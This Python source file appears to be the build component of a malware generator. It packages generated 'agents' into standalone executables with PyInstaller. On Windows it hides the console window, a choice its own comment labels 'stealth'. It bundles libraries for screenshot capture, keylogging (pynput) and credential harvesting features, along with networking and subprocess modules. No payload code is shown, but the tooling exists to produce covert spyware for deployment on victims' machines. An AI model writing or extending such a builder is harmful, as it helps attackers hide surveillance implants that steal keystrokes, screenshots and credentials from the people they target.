"""
Executable Builder Service

Packages Python agents into standalone executables using PyInstaller.
"""

import subprocess
import os
import shutil
from pathlib import Path
from typing import Dict, Any, Optional


class ExecutableBuilder:
    """
    Builds standalone executables from Python agents.
    
    Uses PyInstaller to create platform-specific executables
    that include all dependencies.
    """
    
    def __init__(self):
        # Get absolute paths
        current_file = Path(__file__).resolve()
        backend_dir = current_file.parent.parent.parent
        
        self.build_dir = backend_dir / "build"
        self.dist_dir = backend_dir / "generated_agents" / "executables"
        
        # Create directories
        self.build_dir.mkdir(exist_ok=True)
        self.dist_dir.mkdir(exist_ok=True)
        
        print(f"📂 Build directory: {self.build_dir}")
        print(f"📂 Output directory: {self.dist_dir}")
    
    def build(
        self,
        agent_filepath: str,
        platform: str,
        features: list,
        config: Dict[str, Any]
    ) -> Optional[str]:
        """
        Build standalone executable from Python agent.
        
        Args:
            agent_filepath: Path to Python agent file
            platform: Target platform (windows, linux, macos)
            features: List of enabled features
            config: Agent configuration
        
        Returns:
            Path to executable file, or None if build failed
        """
        
        agent_path = Path(agent_filepath)
        
        if not agent_path.exists():
            print(f"❌ Agent file not found: {agent_filepath}")
            return None
        
        # Use custom name or agent ID
        if config.get("custom_name"):
            base_name = config["custom_name"]
        else:
            base_name = f"agent_{config['agent_id']}"
        
        # Platform-specific executable name
        if platform.lower() == "windows":
            exe_name = f"{base_name}.exe"
        else:
            exe_name = base_name
        
        exe_path = self.dist_dir / exe_name
        
        print(f"🔨 Building executable: {exe_name}")
        print(f"   Platform: {platform}")
        print(f"   Features: {', '.join(features) if features else 'none'}")
        
        # Build PyInstaller command
        command = self._build_command(agent_path, base_name, platform, features)
        
        try:
            # Run PyInstaller
            print("⏳ Running PyInstaller (this may take 1-2 minutes)...")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=300, # 5 minute timeout
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if platform.lower() == "windows" else 0,
                shell=False  # ← ADD THIS
            )
            
            if result.returncode != 0:
                print(f"❌ PyInstaller failed:")
                print(f"STDOUT: {result.stdout}")
                print(f"STDERR: {result.stderr}")
                return None
            
            # Check if executable was created
            if not exe_path.exists():
                print(f"❌ Executable not found at: {exe_path}")
                return None
            
            size_mb = exe_path.stat().st_size / 1024 / 1024
            print(f"✅ Executable built successfully!")
            print(f"   📦 Size: {size_mb:.2f} MB")
            print(f"   📁 Location: {exe_path}")
            
            # Clean up build artifacts
            self._cleanup_build_files(base_name)
            
            return str(exe_path)
            
        except subprocess.TimeoutExpired:
            print("❌ Build timed out after 5 minutes")
            return None
        except Exception as e:
            print(f"❌ Build error: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def _build_command(
        self,
        agent_path: Path,
        base_name: str,
        platform: str,
        features: list
    ) -> list:
        """Build PyInstaller command with appropriate options"""
        
        command = [
            "pyinstaller",
            "--onefile",  # Single executable
            "--clean",    # Clean cache
            "--name", base_name,
            "--distpath", str(self.dist_dir),
            "--workpath", str(self.build_dir / "work"),
            "--specpath", str(self.build_dir / "specs"),
        ]
        
        # Platform-specific options
        if platform.lower() == "windows":
            command.extend([
                "--noconsole",  # No console window (stealth)
                "--icon", "NONE",  # No icon (can add custom icon later)
            ])
        
        # Add hidden imports for features
        hidden_imports = self._get_hidden_imports(features)
        for module in hidden_imports:
            command.extend(["--hidden-import", module])
        
        # Add the agent file
        command.append(str(agent_path))
        
        return command
    
    def _get_hidden_imports(self, features: list) -> list:
        """Get list of modules to include based on features"""
        
        imports = [
            "requests",
            "urllib3",
            "json",
            "base64",
            "socket",
            "platform",
            "subprocess",
            "time",
            "datetime",
            "os",
            "sys",
        ]
        
        # Feature-specific imports
        if "screenshot" in features:
            imports.extend([
                "PIL",
                "PIL.Image",
                "PIL.ImageGrab",
            ])
        
        if "keylogger" in features:
            imports.extend([
                "pynput",
                "pynput.keyboard",
            ])
        
        if "credentials" in features:
            imports.extend([
                "re",
            ])
        
        return imports
    
    def _cleanup_build_files(self, base_name: str):
        """Clean up temporary build files"""
        
        # Remove work directory
        work_dir = self.build_dir / "work"
        if work_dir.exists():
            shutil.rmtree(work_dir, ignore_errors=True)
        
        # Remove spec file
        spec_file = self.build_dir / "specs" / f"{base_name}.spec"
        if spec_file.exists():
            spec_file.unlink()
        
        print("🧹 Cleaned up build artifacts")
    
    def get_executable_path(self, base_name: str, platform: str) -> Path:
        """Get path to executable for given base name"""
        
        if platform.lower() == "windows":
            filename = f"{base_name}.exe"
        else:
            filename = base_name
        
        return self.dist_dir / filename